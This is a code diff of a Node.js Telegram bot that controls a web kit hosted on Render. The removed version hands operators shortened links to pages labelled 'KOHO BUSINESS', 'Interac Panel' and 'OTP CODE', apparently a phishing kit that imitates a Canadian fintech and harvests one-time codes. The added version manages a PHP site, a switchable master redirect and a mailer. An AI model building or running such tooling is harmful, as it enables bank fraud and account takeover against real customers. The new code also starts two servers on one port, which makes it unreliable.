@@ -1,245 +1,89 @@
-#!/usr/bin/env node
-import fs from "fs"
-import path from "path"
-import http from "http"
-import https from "https"
-import express from "express"
-import fetch from "node-fetch"
-import TelegramBot from "node-telegram-bot-api"
-import { fileURLToPath } from "url"
+const fs = require('fs');
+const express = require('express');
+const { spawn } = require('child_process');
+const TelegramBot = require('node-telegram-bot-api');
+const config = require('./config.json');
+const { sendMail } = require('./mailer');
 
-const __filename = fileURLToPath(import.meta.url)
-const __dirname = path.dirname(__filename)
+const app = express();
+const PORT = process.env.PORT || 3000;
+const bot = new TelegramBot(config.botToken, { polling: true });
 
-// ─────────────────────────────────────
-// CONFIG
-// ─────────────────────────────────────
-const BASE = __dirname
-const DOT_WWW = path.join(BASE, ".www")
-const WWW = path.join(BASE, "www")
-const LOGS = path.join(BASE, ".logs")
-const DATA = path.join(BASE, ".data")
-const WATCHERS_FILE = path.join(DATA, "watchers.json")
+// ---------- START PHP SERVER ----------
+spawn('php', ['-S', `0.0.0.0:${PORT}`, '-t', 'www'], { stdio: 'inherit' });
 
-const BOT_NAME = "Sarah"
-const PROJECT_NAME = "PROJECT-SARAH"
-const TOKEN = process.env.BOT_TOKEN
-const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL
-
-if (!TOKEN) throw "❌ BOT_TOKEN missing"
-if (!PUBLIC_URL) throw "❌ RENDER_EXTERNAL_URL missing"
-
-if (!fs.existsSync(LOGS)) fs.mkdirSync(LOGS)
-if (!fs.existsSync(DATA)) fs.mkdirSync(DATA)
-
-const bot = new TelegramBot(TOKEN, { polling: true })
-
-// ─────────────────────────────────────
-// STATE
-// ─────────────────────────────────────
-const S = {
-  url: PUBLIC_URL,
-  started: Date.now(),
-  watchers: new Set(),
-  progressMid: {},
-  lastOnline: null,
+// ---------- TELEGRAM ACCESS CHECK ----------
+function allowed(chatId) {
+  if (config.autoDetectChats && !config.allowedChats.includes(chatId)) {
+    config.allowedChats.push(chatId);
+    fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
+  }
+  return config.allowedChats.includes(chatId);
 }
 
-// ─────────────────────────────────────
-// UTIL
-// ─────────────────────────────────────
-function log(msg) {
-  const line = `[${new Date().toISOString()}] ${msg}\n`
-  console.log(line.trim())
-  fs.appendFileSync(path.join(LOGS, "debug.log"), line)
-}
+// ---------- TELEGRAM COMMANDS ----------
 
-function loadWatchers() {
-  if (fs.existsSync(WATCHERS_FILE)) {
-    try {
-      S.watchers = new Set(JSON.parse(fs.readFileSync(WATCHERS_FILE)))
-    } catch { S.watchers = new Set() }
-  }
-}
+bot.on('message', async (msg) => {
+  const chatId = msg.chat.id;
+  if (!allowed(chatId)) return;
 
-function saveWatchers() {
-  fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...S.watchers]))
-}
+  if (msg.text === '/start') {
+    bot.sendMessage(chatId,
+`Controller Online
 
-function ensureWWW() {
-  if (!fs.existsSync(DOT_WWW)) fs.mkdirSync(DOT_WWW)
-  if (!fs.existsSync(WWW)) fs.mkdirSync(WWW)
-
-  if (!fs.existsSync(path.join(DOT_WWW, "splash.php"))) {
-    fs.writeFileSync(path.join(DOT_WWW, "splash.php"), `<h1>Koho Web App</h1>`)
+/status
+/redirect_on
+/redirect_off
+/setredirect URL
+/testmail`
+    );
   }
 
-  for (const dir of ["dashboard","metrics","docs"]) {
-    const d = path.join(DOT_WWW, dir)
-    if (!fs.existsSync(d)) {
-      fs.mkdirSync(d, { recursive:true })
-      fs.writeFileSync(path.join(d, "index.html"), `<h1>${dir}</h1>`)
-    }
+  if (msg.text === '/status') {
+    bot.sendMessage(chatId, `
+Status:
+Redirect: ${config.masterRedirect}
+Authorized chats: ${config.allowedChats.length}
+Server: ACTIVE
+    `);
   }
 
-  fs.cpSync(DOT_WWW, WWW, { recursive:true })
-}
+  if (msg.text.startsWith('/setredirect')) {
+    const url = msg.text.split(' ')[1];
+    if (!url) return bot.sendMessage(chatId, "Provide a URL");
 
-async function shorten(url) {
-  try {
-    const r = await fetch(`https://clck.ru/--?url=${encodeURIComponent(url)}`)
-    const t = (await r.text()).trim()
-    return t.startsWith("http") ? t : url
-  } catch {
-    return url
-  }
-}
+    config.masterRedirect = url;
+    fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
 
-function blockBar(p, w=15) {
-  const n = Math.round(w * Math.max(0, Math.min(1, p)))
-  return "▮".repeat(n) + "▯".repeat(w - n)
-}
-
-async function httpCheck(url) {
-  try {
-    const r = await fetch(url, { method:"HEAD" })
-    return r.ok
-  } catch {
-    return false
-  }
-}
-
-// ─────────────────────────────────────
-// EXPRESS SERVER (Render-ready)
-// ─────────────────────────────────────
-ensureWWW()
-
-const app = express()
-app.use(express.static(WWW))
-
-app.get("/splash.php", (req,res) => {
-  res.send("<h1>Koho Web App</h1>")
-})
-
-const PORT = process.env.PORT || 3000
-app.listen(PORT, () => log(`Web online @ ${PORT}`))
-
-// ─────────────────────────────────────
-// TELEGRAM UI
-// ─────────────────────────────────────
-function linksPanel(base) {
-  const routes = [
-    ["/splash.php","KOHO BUSINESS"],
-    ["/blacklist.php","Interac Panel"],
-    ["/otp.php","OTP CODE"]
-  ]
-
-  return {
-    inline_keyboard: routes.map(([path,name]) => [{
-      text: name,
-      url: `${base}${path}?src=sarah`
-    }])
-  }
-}
-
-function mainKB() {
-  return {
-    keyboard: [
-      ["▶️ START","📎 LINKS MENU","⏹ STOP"],
-      ["📊 STATUS","📝 LOGS","👁 WATCH"],
-      ["❓ HELP","⚠️ DISCLAIMER","⚙️ SETTINGS"]
-    ],
-    resize_keyboard: true
-  }
-}
-
-const INTRO = `Hi, I’m ${BOT_NAME} — welcome to ${PROJECT_NAME}.
-Hosted on Render. No tunnel needed.
-Tap ▶️ START to initialize.`
-
-const HELP = `
-▶️ START - prepares site
-📎 LINKS MENU - show links
-📊 STATUS - check health
-👁 WATCH - toggle alerts
-`
-
-// ─────────────────────────────────────
-// BOT HANDLERS
-// ─────────────────────────────────────
-bot.onText(/\/start/, (m) => {
-  S.watchers.add(m.chat.id)
-  saveWatchers()
-  bot.sendMessage(m.chat.id, INTRO, { reply_markup: mainKB() })
-})
-
-bot.on("message", async (m) => {
-  const text = (m.text || "").toUpperCase()
-  const cid = m.chat.id
-  S.watchers.add(cid); saveWatchers()
-
-  if (text.includes("START")) {
-    const mid = (await bot.sendMessage(cid, blockBar(0))).message_id
-
-    for (let i=1;i<=15;i++) {
-      await bot.editMessageText(blockBar(i/15), { chat_id:cid, message_id:mid })
-      await new Promise(r=>setTimeout(r,40))
-    }
-
-    return bot.sendMessage(cid,"Links ready", { reply_markup: linksPanel(PUBLIC_URL) })
+    bot.sendMessage(chatId, `Redirect set to: ${url}`);
   }
 
-  if (text.includes("LINK")) {
-    return bot.sendMessage(cid,"Quick links:", { reply_markup: linksPanel(PUBLIC_URL) })
+  if (msg.text === '/redirect_on') {
+    fs.writeFileSync('./www/redirect.txt', config.masterRedirect);
+    bot.sendMessage(chatId, "Master redirect ON");
   }
 
-  if (text.includes("STATUS")) {
-    const ok = await httpCheck(PUBLIC_URL + "/splash.php")
-    const up = Math.floor((Date.now()-S.started)/1000)
-    return bot.sendMessage(cid, `${ok?"🟢 Online":"🔴 Offline"}\nUptime: ${up}s\n${PUBLIC_URL}`, { reply_markup: mainKB() })
+  if (msg.text === '/redirect_off') {
+    if (fs.existsSync('./www/redirect.txt'))
+      fs.unlinkSync('./www/redirect.txt');
+
+    bot.sendMessage(chatId, "Master redirect OFF");
   }
 
-  if (text.includes("LOG")) {
-    const data = fs.existsSync(path.join(LOGS,"debug.log"))
-      ? fs.readFileSync(path.join(LOGS,"debug.log"),"utf8").slice(-1800)
-      : "No logs"
-    return bot.sendMessage(cid, data)
+  if (msg.text === '/testmail') {
+    sendMail({
+      to: msg.from.username + "@example.com",
+      subject: "Test Notification",
+      html: "<h2>System active</h2><p>Mailer online.</p>"
+    });
+
+    bot.sendMessage(chatId, "Test mail sent (if valid)");
   }
+});
 
-  if (text.includes("WATCH")) {
-    if (S.watchers.has(cid)) {
-      S.watchers.delete(cid)
-      bot.sendMessage(cid,"Watch disabled")
-    } else {
-      S.watchers.add(cid)
-      bot.sendMessage(cid,"Watch enabled")
-    }
-    saveWatchers()
-    return
-  }
+// ---------- WEB SIDE ----------
+app.get('/', (req, res) => {
+  res.send('Render Node Controller is running.');
+});
 
-  if (text.includes("HELP")) {
-    return bot.sendMessage(cid, HELP, { reply_markup: mainKB() })
-  }
-
-  bot.sendMessage(cid,"Try START or STATUS", { reply_markup: mainKB() })
-})
-
-// ─────────────────────────────────────
-// MONITOR
-// ─────────────────────────────────────
-setInterval(async ()=>{
-  if (!S.watchers.size) return
-  const ok = await httpCheck(PUBLIC_URL + "/splash.php")
-
-  if (S.lastOnline === null) S.lastOnline = ok
-  if (ok !== S.lastOnline) {
-    S.lastOnline = ok
-    for (const id of S.watchers) {
-      bot.sendMessage(id, ok ? "✅ Back online" : "⚠️ Went offline")
-    }
-  }
-}, 10000)
-
-loadWatchers()
-log("Bot upgraded & online – Render edition")
+app.listen(PORT, () => console.log("Node controller active"));
